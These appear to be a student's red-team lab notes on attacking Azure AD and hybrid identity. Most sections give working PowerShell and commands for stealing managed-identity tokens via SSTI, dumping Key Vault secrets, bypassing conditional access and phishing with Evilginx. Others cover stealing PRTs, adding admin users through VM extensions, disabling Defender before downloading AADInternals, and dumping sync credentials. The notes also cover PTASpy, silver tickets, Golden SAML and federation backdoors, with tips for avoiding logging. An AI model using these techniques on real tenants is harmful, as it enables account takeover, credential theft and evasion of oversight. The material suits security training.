### AAD Graph Module
Use the AAD Graph  module (AzureAD) because there is no logging whatsoever on that API. The new graph modules do log request and can be queried but the old module thats soon to be axed is quiet.

Pcik AzureADPreview or AzureAD, importing both will break cmdlets.

### Apps

Apps are very interesting targets.

There are two types of applications, App Registrations and Enterprise Apps.

In powershell App Registrations is called 'Apps' and Enterprise Apps are called 'Service Principals', confusingly.

####  App Registrations, Roles and Multi-Tenant Apps

App Registrations are a way for you to allow an app to authenticate using azuread. You give it credentials from AzureAD so it can auth with AzureAD.

- App Registration / App Config: The Global part of an app, the configuration part
    Protects an App with AzureAD so that it can only be accessed through AAD Auth
    Cannot be assigned a role directly

- Enterprise App / Service Principal / "Service Accounts": The direct associated identity that gets assigned roles
    When an App Registration is created and used for the first time, a service principal/enterprise app is created that can be assigned rules, etc, like a user

- Multi-Tenant Apps: If multi-tenant, their will be an enterprise app service principal created in the other tenant as well. 
    App Registration / Config only applies to the first tenant, you cannot modify an app registration in the other tenant 

#### Pitfalls

- Noise: Adding an app secret is loud in the Activity logs, easy to alert on a new principal added
- Look for Apps with App Passwords: These look a little less noisy, adding secrets to apps that have already had secrets added
- Apps with A Lot of Service Principals: Blend in with the crowd

### Detailed Enumeration / Network Profiles / Rule Sets

Easily overlooked attributes can contain powerful information. 

- Network Profiles: If you have reader access on a network profile, you could get the public Ip associated with the NIC. 
- Network Rule Sets: Easily overlooked attribute that can containrules like "which IP can access this storage account", usually resources allowed by Conditional Access and everywhere else

### KeyVault - Connect-AzAccount for Multi-Token Actions

We compromised a webserver using SSTI and used it's managed ID on a keyvault to request the access tokens, both for that vault and for the ARM API. It was a Jinja template and we use ['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version...') and ['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version...').

Store the tokens and the clientId in vars and use them with Connect-AzAccount

```powershell
$token = ''
$keyvaulttoken = ''
$clientId = ''
$vaultName = ''
$secretName = ''

Connect-AzAccount -AccessToken $token -KeyVaultToken $keyvaulttoken -AccountId $clientId
Get-AzResource # Found the vault
Get-AzKeyVaultSecret -Vaultname $vaultName # saw the secret
Get-AzKeyVaultSecret -Vaultname $vaultName -Name $secretName # got the value
```

### Evading ConditionalAccess - Kathy/BLock management at the Portal

The password we found in the vault is for a user restriced by CAPs. The selected app for this policy is

'Windows Service Management API' it blocks the cli and the Portal. In the lab, its set for browser only. I think we can set Mobile Apps, and Desktop Clients, and Legacy Auth clients here as well. We could make a policy to block all of that, and create a group for the users we want to exclude, and filter them out. There is 'Require MFA strength' which lets us pick regular, passwordless (app) or resistant (fido). You can either require MFa for the policy or requyire a specific strength but noit both toggles

"If Kathy tries to access service management apps using browser,  then block access" is the logic

Shes blocked at the portal, but we're logged in using Az module, and can see she has rights on a jumpVM and its agent. Get-AzRoleAssignment shows we have Executor from the group VM Admins. That same group gives the Reader role on the JumpVM.

***TODO: Try MFASweep as Kathy


### Check All of Kathys Roles and Password Resets via Admin Units
We read the IAM of jump VM, find VM Admins group and check that out. Members of VM Admins get executor rights on jumpvm. It also is part of an Admin Unit called 'Control Unit'. Members of VM Admins get added to that unit, similar to an OU in AD. Control Unit limits privileges a bit. Can scope an admin, or wahtever role, to just the Unit. You could make someone a help desk passwrod reset admin of a particular group for a location or something.


```powershell
Get-AzRoleAssignment # Found We get EXecutor role inherited from being in VM Admins
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# check what roles and groups and administrative units for a particulkar user
$Token = (Get-AzAccessToken -Resourceurl https://graph.microsoft.com).Token
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor1@dercorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $Token"    
    }
}
(Invoke-RestMethod @RequestParams).Value
```

RoyGCain has Authetnication Administrator role active assigned to him but scoped to Control Unit only. This administrative unit is the VM Admins scopeing group. This effectively gives Roy the ability to reset users passwords inside COntrol Unit only. If we compromise his account we get way more options.

### Investigate Roles assigned to Administrative units with AzureAD Module
```powershell
$controlUnitId = ""
$kathy = (Get-Credential)
Connect-AzureAD -Credential $creds
Get-AzureADMSAdminisitrativeUnit -Id $controlUnitId # shows deets about the unit
Get-AzureAdScopedRoleMembership -Id $controlUnitId | fl * # shows a role assignment to roy and ObjectId
Get-AzureADDirectoryRole -ObjectId 5b3... # check out the role
```

### EvilGin2 - Phishing for Further Access
Roy's about to get phished for this. We have admin/admin creds on a DNS server in the network, we'll use it for evilginx DNS.  Update NS record and SOA to the DNS servers own IP address.  
We create a zone to match student1.corp using the smae DNS. Now we need an A record for login.login and the IPv4 of Evilinx, add www.login, as well same way.

Turn off 365 Stealer, they use the same port. Can edit the self-signed certs if you want in that evilginx directory.

We phish ol Roy, he gives us his password. If his account had MFA enabled, we would get the authenticated cookies to replay as well. 

- *Defensive Consideration*: We have two chances to detect this. At time of phishing, hopefully with our logic app, and here, as the attacker either authneticates with the password or replays the cookie. After this, the attacker is authenticated and doesn't generate new events. 

We use roys account to reset one of the VM Contributors roles. It's noisy, but we change the passwrod and connect as them. We create a new local user on the Vm using Az Vm Run command again to simulate what would be a beacon. 

### Enterprise Apps / Service Principals as "App Instances" / Powershell Terminology

In PoSh, App Registrations are application templates, enterprise apps or service principals are the visible usable parts of the app. 

        Application: Only present in the tenant it was created in. These are app registrations in the portal. Our client's concent grant app was an Enterprise Application, where the Application was registered in their tenant, we could not see it in that blade in ours.

        Service Principal/EnterPrise Application: Present in every directory where application is used (for say multi-tenant). This is visible under Enterprise Applications. Azure RBAC roles use service principal. 

"An application has one application object in its home directory that is referenced by one or more service principals in each of the directories where it operates (including the applications home directory)"

Service Principals are Instances of the Application.

App Identities are always preferred over users, as workload identtity doesn't generate risk events etc.

If we can create a client secret or app password for an application object we can

- Login as SP for App
- Bypass MFA
- Access all the resources where roles are assigned to the service principal
- Add credentials to an enterprise application for persistence after compromising a tenant
X No Portal

### PrivEsc -  Deployment History and ARM Templates

Each RG maintains a history for up to 800 deployments. THe history gets deleted when the count exceeds 775. Users with Microsoft.Resources/deployments/read and Microsoft.Resources/subscriptions/resourceGroups/read can read deployment history

All azure role assignments are validated against ARM service. ARM is the gatekeeper for Azure resources. It's also the IaC service component of Azure. JSON configs and Bicep can be used to deploy IaC across reosurces in associated tenant.

Has historical data and information about what may be deployed in the future. If a deployment uses String instead of SecureString  for parameters, we can find clear-text credentials. No logs for reading these templates, or really do anything with the ARM templates oddly.

We'll abuse the mangedID of a function app 'processfile' to compromise its enterprise application, then enumerate the Ent App permissions in defcorphq and abuse these permissions to extract secrets from another keyvault. Using the keyvault secrets, extract credentials of a user from the deployment history of a resource group.

### Conditional Access Bypass - Spoofing USer Agents

Connecting AzASccount with a service principal saves the secret in plaintext to ~/.Azure/AzureRMContext.json in the userprofile. We log in with secret we added earlier to functionapp.

We had keyvault access on credvault-fileapp with mobile users backup file. We Get-AzKeyVaultSecret -AsPlainText and got Davids creds.

We get stopped here by "BlockDesktopAccessforDavidH" trying to connect AzAccount as David. The policy is blocking Windows and MacOS. This is a User Agent string check, we can spoof our way past this easily. We opened dev tools with F12, toggle device toolbar, try 'ipad pro' or whatever that meets your criteria for access.

Once we bypass CAP, David has the rights to read the deployment history of the RG. We find a users password to a diffrent tenant in the Templates VM Script Extension. 

#TODO: investigate this toehr tenant, its video 3 towards the end around david henriquez prob labex 15-18 area

## Day 4

### Backdoor Deployment

We backdoored a deployment to run code to grab the access token of its managed identity. We sign in with this token and check it's reach

```powershell
Get-AzResource # wont show if you just have rights on an RG
$groups = Get-AzResourceGroup # so check then check deployment details
foreach ($group in $groups) {
   $deps = Get-AzResourceGroupDeployment -ResourceGroupName $group.ResourceGroupName
   Write-Host $deps # we see a VM passwrod here
}
# Saving Template - Ddeployment for SAP group had passwords in the deployment history for the VM it deploys, lets checkout the template for the one with the script extension
Save-AzResourceGrroupDeploymentTemplate -ResourceGroupName $group.ResourceGroupName -DeploymentName stevencking_defcorphq@.onmicrosoft.com.sapsrv

# We find another password for stevencking in ScriptExtension commandToExecute field
cat stevencking_defcorphq@.onmicrosoft.com.sapsrv | findstr 'commandToExecute'

# Use Steven PW to Connect
Connect-AzAccount
Get-AzResourceGroup
Get-AzResource
Get-AzStorageContainer -Context (NEw-AzStorageContext -StorageAccountName defcorpcodebackup)

# Moved over to Storage Explorer
```

The same codebackup from earlier that gave us the Authetnicator app backup for the simpleapps, we access with the new user.
Storage Explorer revealed README and id_rsa key. The key is for jenniferazad and its code key for Github. This is the other user we folund in the Dockerfile earlier.

### FunctionApp /SSH Key / Pass Phrase
We use the same password for jenniferazad we found in the Dockerfile as the passphrase for SSH

```cmd
copy .\id_rsa ~\.ssh
ssh -T git@github.com
```

We have access to createusers repo, another function app deployment with json files and example for hopw to create a user programmatically. We clone the directory and we create a new azuread user
using the example, mkdir student 666 and notepad user.json. Ran the app, and created our new user

### Azure VM - User Data 
SImilar to "Description" in AD, but not really, as only people who can read it are the other processes on the VM. That said, ANY process on the VM can access this data using IMDS. Persists reboot, unencrypted, If you have command execution on a VM, you can read or inject a base64 encoded command 64kb or less. Can Contain powershell scripts, domain info, onboarding agents, config, etc. 

This is seen a lot performing Domain Join operations w/ terraform or other IaC tools. Since a standard user can only join 10 machines (or if the quota is correctly set to 0, none), many times a domain admin credential is used here.

It's possible to modify if you have Microsoft.Compute/virtualMachines/write. We can abuse automation/scheduled tasks that use the UserData for input. Modification event shows in logs but not what changes were made.

```powershell
# Retrieve user data
$userData=Invoke-RestMethod-Headers@{"Metadata"="true"} -Method GET -Uri"http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Modify user data
$resourceGroup = ""
$sub = ""
$vmName = ""
$location = ""

$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accessToken=(Get-AzAccessToken).Token
$Url="https://management.azure.com/subscriptions/$sub/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/$vmName?api-version=2021-07-01"
$body=@(
@{
location ="$location"
properties =@{
userData="$data"
}
}
) |ConvertTo-Json-Depth4
$headers=@{Authorization ="Bearer $accessToken"}

# Execute Rest API Call
$Results=Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType'application/json'
```

### Azure VM - Script Extensions

"Small Applications" Extensions run as SYSTEM via inline or remote script (from blob via managed identity). Can be deployed to a running VM. Only one extension can be added to a VM. It is not possible to add multiple custom script extensions to a single VM. 

Custom Script Extension is what we abused twice already in the Deployment reading, for Steven King's creds earlier. Used as a short-cut where a managed identity would be better often. 
 
Required to modify
 Microsoft.Compute/virtualMachines/extensions/write
 Microsoft.Compute/virtualMachines/extensions/read (if you want to see the output)

The user data contained creds for SamCGray, so we connect az him and see he has at least reader on the MicrosftmOnitoringAgent extension running on infradminsrv with our familiar Get-AzResource and Get-AzRoleAssignment

***INTERESTINGNOTE: Get-AzResource shows us the reader+ on the extension itself. Get-AzRoleAssignment shows NOTHING. Doesnt mean we cant list role assignments, it means Get-AzRoleAssignment is incapable of reading roles ON EXTENSIONS THEMSELVES. So be aware, that even with Az we can miss things. We have to use the API for this.

```powershell
$Token = (Get-AzAccessToken).Token
$Url="https://management.azure.com/subscriptions/$sub/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/infraadminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

$RequestParams = @{
    Method = GET
    Uri = $Url
    Headers = @{
        'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod $RequestParams).Value
```

Shows we have Read/Write.

We update the extension to add our user, in real life this would be another beacon. 

```powershell
Set-AzVMExtension -TypeHandlerVersion 1.9 -Publisher Microsoft.Compute -ExtensionName ExecCmd -ExtensionType CustomScriptExtension -VmName infradminsrv -location 'Germany West Central' -ResourceGroupName Research  -SettingString '{"commandToExecute":"powershell net users student94 StudentPassword@123 /add /Y; net localgroup administrators student94 /add"}' 
```

We cant Double-Hop PsSessions to PsSession, but we create a new PSSession with the remote VM and Invoke-Command to run "dsregcmd /status". This gives us a lot of information, if its azureAD/DOmain Joined, Device and Tenant details, etc.

### PRT

PRT Token is the SSO token and used to always carry MFA claim. Now there are different PRTs, prior to august 2021 you could steal the PRT and never use MFA. Now post-patch, the PRTs are MFA-Based (Windows Hello or Windows Account Manager) or not (others) so you can't just extract one and expect MFA bypass.

- Issues to a user for a specific device
- Obtains access/Refresh tokens to any app
- Valid 90 days if continuously renewed
- CloudAP SSP requeusts and caches PRT on device
- If PRT is NFA Basedm the claim is transferred to app tokens to prevent MFA challenge for every App. When you do MFA during Autopilot and after that you don't get the prompt again for some of the apps.
- Can use it on other devices
- Prior to 2021 PRT always had the MFA Claims

If we get an Az/Hybrid joined or even a registered device signed into office or OneDrive you can extract a PRT.

#### Pass the PRT / Pass the Cookie

- **x-ms-RefreshTokenCredential:** Chrome uses BrowserCore.exe to use PRT and request PRT Cookie for SSO experience
PRT Cookie - x-ms-RefreshTokenCredential - can be used in a browser to access any application as the user.

https://github.com/dirkjanm/ROADtoken
https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/

AzureAD uses a nonce, we have to request one from the APi.

<code from slide>

```powershell
RoadToken.exe <nonce>
```

Or AADInternals to use it

```powershell
Get-AADIntUserPRTToken
```

Once we have the PRT, copy it, open browser in incognito  mode

- https://login.microsoft.com/login.srf
- F12 > Application > Cookies
- Clear all cookies
- Create one names x-ms-RefreshTokenCredential and paste the value of PRT
- Mark HTTPOnly and Secure for the cookie
- Visit https://login.microsoft.com/login.srf again

Note: Location based CAP would blokc Pass-the-PRT whereas "require compliant and/or azureAD joined device" is bypassed

MIchael Baron has a CAP for device joined. We're going to extract his PRT and use it to bypass CAPs.

#### Harvest PRT From VM
LEt's see if there any users signed in we could steal from

```
# See another user remoted in over RDP
Invoke-Command -Session $infraadminsrv -ScriptBlock{qwinsta}

# Check if that user would have a PRT AzureAD\MichaelMBarron
Invoke-Command -Session $infraadminsrv -ScriptBlock{Get-Process -IncludeUsername}
```

We use PSExec to start SYSTEM cmd.exe to run SessionExec to execute ROADTOken.exe in aother users session write output to PRT.txt. THe contents are a response containing the x-ms-RefreshTokenCredential and some other data.

We sign in with the browser to M Baron as Intune admin in endpoint center.

We check SignInLogs and see a different IP from using the token in the browser.

#### Dynamic Groups

A user can't change their own email address but they cna invite a guest user with any email address. If there is a dynamic group, say if Property Mail-Match-finance and 

Only admins can change properties like "Department"

If the "mail" property match "admin" and userType equls "Guest" etc

If the Dynamic Membership rules involve the properties "otherMails" and userType -eq "guest" i.e. if "otherMail contains 'vendor'", add to IT group.

We could invite a guest user, which can modify the 'otherEmail' of their their own account, we add a secondary email with 'vendor' in the name we control and our guest user will join that group and inherit it's permissions.

#### Tenant-to-Tenant Lateral Movement

Enumerate dynamic groups as thomasebarlow@defcorpit.onmicrosoft.com, then invite our student@defcorpextcontractors.onmicrosoft.com (OG attacker account)

We control these settings from 'External Collaboration Settings' 

We could scope only admins can invite guests, no guests, users/users less privileged, and we can set waht level of access. 

We can set it Guest User Access is restricted to properties and memerships of their own directory objects

#### Application Proxy

We run an old app on AD that requires SSO, we can expose an endpoint to web and have AzureAD/CAPs in front of it so users authenticate there and the proxy passes the token to the agent running on-prem.

No Port-forwarding, just web ports. Can be abused for C2.

Protects Auth phase only, if the application has web vulns, they are still abuseable, which means we could abuse weak web application to move laterally/vertically to the domain.

##### Application Proxy Enumeration
We enumerate the appls with Get-AzureADApplication, notice the Finance App and retrieve its service principal (enterprise Application)
```powershell
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
$objId = Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
$ID = $objId.ObjectID
```

Use the script provided to users and groups allowed to use the application
```powershell
# Use the following ps1 script from https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/scripts/powershell-display-users-group-of-app
# to find users and groups assigned to the application. Pass the ObjectID of the Service Principal to it
. C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1

Get-ApplicationProxyAssignedUsersAndGroups -ObjectId $ID
```

Find users and groups that can access and either compromise users or get ourself into the group (UpdateableGroups, DynamicGroups, Cloned Groups, etc)

The studentx account we created in the Github CreateUsers repo is what we'll use to enumerate proxies. These users get added to "Operations" group and Operations has access to this application. Since that user can access, we then check out the app.

We abuse a file upload vulnerability in the proxied application to extract credentials.


#### Hybrid Identity

PHS:
    - Syncs Users/Hash from On-Prem to AzureAD, simplest and most popular way of doing hybrid
    - PHS is required for IDentity Protection and AAD Domain services
    - Hash sync every 2 minutes
    - When a user tries access Azure resources, auth takes place ON AzureAD
    - Built-in Security Groups (DOmain admins) do not sync
    - By default password expiry and account expiry are NOT reflected in AzureAD, ifan account expires (not forced password change) on-prem the user can continue accessing Cloud resources using the old password.

    - Configuration:
        MSOL_<installationID> account created in On-Prem AD. This account has replication (DCSync) permissions in the on-prem AD.
        Sync_<Name of OnPrem ADConnect server>_<InstallationID>. This account can reset the password of ANY user Cloud or AD Synced.

        Both accounts passwords are stored in a SQL server on the ADConnect server and it's possible to extract in clear-text if you have admin privileges on the server.
        Check if a server is running ADConnect:
        
        ```powershell
        Get-ADSyncConnector
        ```        
    
    - Detect:
        DCsync attacks will light MDI up like a christmas tree, but most environments white-list this account since it will generate such a high volume of alerts from the start, as its sole purpose is to perform DCsyncs.
        Compromising local admin of the server and abusing that account for Sync operations will look no different than what it does every two minutes. 

    - Lateral Movement Cloud to On-Prem:
        Once you have local admin rights on the server, disable monitoring and bring AADinternals over to decrypt plain-text sync credentials. 

        ```powershell
        Set-MpPreference -DisableRealtimeMonitoring $true
        iwr $url -o aadint.zip; Expand-Archive .\aadint.zip
        Import-Module .\AADInternals.psd1
        Get-AADIntSyncCredentials
        ```

        These credentials can be used to run a DCSync attack against the AD Environment.
        Dont touch LSASS - From your own host could do something like 'Invoke-Mimikatz -Cmmand '"lsadump::dcsync /user:domain1\krbtgt /domain:domain1.local /dc:dc.domain1.local"' to get the krbtgt hash

        Cloud to On-Prem:
        Now you can enumerate Global Admins, reset the password of a synced on-prem user using the the ImmutableID (unique GUID derived from On-Prem GUID).
        
        ```powershell
        Get-AADIntGlobalAdmins
        $email = ""
        $Id = Get-AADIntUser -UserPrincipalName $email | select ImmutableId
        Set-AADIntUserPassword -SourceAnchor $Id -Password "Inconceivable2Obscured" -Verbose
        # Access Cloud resources with new password, on-Prem resources with the old password
        ```
        
    - Lateral Movement On-Prem to Cloud:
        Resetting Cloud-Only user requires the CloudAnchor we can get from their cloud ObjectId. 
        CloudAnchor format is "USER_ObjectId"

        ```powershell
        Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectId
        $objId = ""
        Set-AADIntUserPassword -CloudAnchor "User_$ObjId" -Password "Inconceivable2Obscured" -Verbose
        # Can now access any portals with that PW
        ```

        More thorough examples exist down below.

PTA:
    - No passhash sync takes place but identity sync still takes place
    - Useful for enforcing on-prem password policies as Authetnication is validated On-Prem.
    - Comms to cloud via Agent not the DC
    - Only outbound 80,443 from auth agent to AzureAD
    - User tries to access, is redirected to AzureAD sign in, enters credentials, encrypted creds go into a Queue in AzureAD, the PTA agent reads from the queue, requests validation from on prem AD, Agent responds to Azured, AzureAD responds to user and the user gets access

    - Abuse Points:
      Step 6 - Agent Decrypts password using its private Key - If we compromise the agent we can get the cleartext password here.
      Step 9 - Agent returns validationg response to AzureAD
        On-Prem SkeletonKey - AzureAD trusts the agent wholesale, if we get in the middle and become the PTA Agent, we can look at the failed validation request and tell AzureAD "We're good, go ahead" regardless of whether the password is valid or not. We can become any synced user regardless of whether we have their password or not. Just need a valid UPN.
        
        AzureAD SkeletonKey - If we compromise a Global Admin, we can install our OWN PTA agent in our own infrastructure and authorize all login attempts (like a Rogue DC) 

    - Recommended Setup:
        Do not use Intune to manage them so their is no cloud access to these machines. Place them in TierZero where they are protected from access by anything but other servers and OOB management network.
        Restrict Access to these servers to specific domain accounts

    - Lateral Movement On-Prem to Cloud (Local/Domain Admin):
        Once you have local admin rights on the server, disable monitoring and bring AADinternals over, etc
        Once the backdoor is installed, we can auth as any synced user without knowing their password
        It's possible to also observe the cleartext password as on-prem users are authenticating to the cloud.
        The Injection DLL is getting flagged now, may be worth obfuscating and keeping our own version of the DLL
        Passwords and Injection DLL are stored in a hidden C:\PTASpy directory

        ```powershell
        Set-MpPreference -DisableRealtimeMonitoring $true
        iwr $url -o aadint.zip; Expand-Archive .\aadint.zip
        Import-Module .\AADInternals.psd1
        Install-AADIntPTASpy
        Get-AADIntPTASpyLog -DecodePasswords
        ```

    - Lateral Movement On-Prem to Cloud (Global Admin):
        We can register our own PTA Agent after getting GA privileges by setting it up on a machine we control. Once it's setup, we backdoor our own PTA Agent and decode the passwords

        ```powershell
        Set-MpPreference -DisableRealtimeMonitoring $true
        iwr $url -o aadint.zip; Expand-Archive .\aadint.zip
        Import-Module .\AADInternals.psd1
        Install-AADIntPTASpy
        Get-AADIntPTASpyLog -DecodePasswords
        ```           

Seamless SSO:
    - Automagically signs in users when they are on on-prem domain-joined machine. No need to use passwords to log into AzureAD and on-prem apps
    - PHS and PTA supported
    - AZUREADSSOACC is the on-prem account created. It's Kerberos decryption key is shared with AzureAD
    - AzureAD exposes https://autologon.microsoftazuread-sso.com that accepts kerberos tickets. 
    - The domain-joined machines browser forwards tickets to this endpoint for SSO, the endpoint has the azureadsso decryption key to decrypt
    - Service decrypts the kerberos ticket and verifies access

    - Persistence from any Interent Connected Machine:
        Pass/key of this AZUREADSSOACC account never change
        If we can get an NTLM hash of he MACHINE account for that account, we can create Silver Tickets for any synced on-prem user
        Our DCSync attacks earlier should have rendered us this accounts hash
        Create a Silver Ticket using UPN and SID that can be used from anywhere that can access the SSO endpoint

        ```powershell
        $domain = ""
        $sid = ""
        $id = ""
        $hash = "" 
        Invoke-Mimikatz -c "kerberos::golden /user: /sid:$sid /id:$id /domain:$domain /rc4:<$hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"
        ```

Federation:
    - Trust established between two unrelated parties lik one-prem and AzureAd
    - All authetnication happens on-prem in Federation, all of it
    - User experiences SSO across all the federated environments
    - Including cloud and on-prem

    - Overview
        1. user requests access, the service provider find the IDP for that user, generates SAML AuthNRequest
        2. User redirected to their IDP with the SAML request, the IDP authenticates user and generates SAML Token and SAML Response
        3. SAML response sent to service provider as the user is redirected to the SP who verifies the SAML Responses signature and encryption source as a Trusted Idp
        4. Service is provided and the user logs in

    - ADFS
        1. CLaims based model
        2. claims are statements name,group, etc made about users to access claims-based apps located anywhere online
        3. claims writtne inside theSAML Tokens and signed to provide integrity by the IdP
        4. User is IDed across these by ImmutableID, globablly unique and stored in AzureAD
        5. Stored On Prem as ms-DS-ConsistencyGuid for the user and can be dervied from GUID of the user

    - Abuse (Domain Admin):
        1. SAML Response signed by TOken-Signing Certificate
        2. If the certificate is compromised you can authenticate to azuread as any azuread user
        3. Like PTA, password change for a user with MFA won't have any effect because we are forging the authentication response
        4. Certificate can be extracted from ADFS server with DA privs and then abused from any interent connected device\
        5. This is Golden SAML

    - Lateral Movement On-Prem to Cloud:
        1. On-Prem - Extract the signing certificate as DA, select immutableID of an On-Prem user

        ```powershell
        $email = ""
        $ID = Get-AAdIntUser -UserPrincipalName $email | Select-Object -Property immutableId
        Export-AADIntADFSSigningCertificate 
        Open-AADIntOffice365Portal -ImmutableID $ID -Issuer https://domain1.com/adfs/services/trust -PfxFileName cert.pfx -Verbose       
        ```

        2. Cloud-Only - Cloud-Only requires us to create Immutable first use any users with immutableID to access cloud apps 

        ```powershell
        # create realistic ImmutableID and set it for Cloud-Only user
        $email = ""
        $sourceAnchor = Get-AAdIntUser -UserPrincipalName $email | Select-Object -Property sourceAnchor
        $guid = [System.Convert]::ToBase64String((New-Guid).tobytearray())
        $guid = "User_$guid"
        Set-AADIntAzureADObject -CloudAnchor $guid -SourceAnchor $sourceAnchor
        Export-AADIntADFSSigningCertificate
        $ID = "$guid" # ImmutableID of user
        Open-AADIntOffice365Portal -ImmutableID $ID -Issuer https://domain1.com/adfs/services/trust -PfxFileName cert.pfx -Verbose
        ```

    - Persistence (Global Admin and Domain Admin) - SolarWinds Style
        1. If we have GA on a tenant, we can adda new verified domain form our tenant and configure its authentication type to Federed and trust aspecific certfificate "any.sts" in the command and issuer.

        ```powershell          
        ConvertTo-AAdIntBackdoor -DomainName $domain
        $domain = "AttackerControlled.com"

        # Impersonate a User via ImmutableId
        # Get-MSOLUser | select userPrincipalName,ImmutableID   
        $email = ""
        $ID = Get-AAdIntUser -UserPrincipalName $email | Select-Object -Property immutableId

        # a real verified AzureAD domain
        Open-AADIntOffice365Portal -ImmutableID $ID -Issuer https://$domain/b231111" -UseBuiltInCertificate -ByPassMFA $true 
        ```

        2. Create and Import new certificates on ADFS Server

        ```powershell
        New-AADIntADFSSelfSignedCertificates # default cert password AADInternals
        Update-AADIntADFSFederationSettings -Domain $domain
        ```        


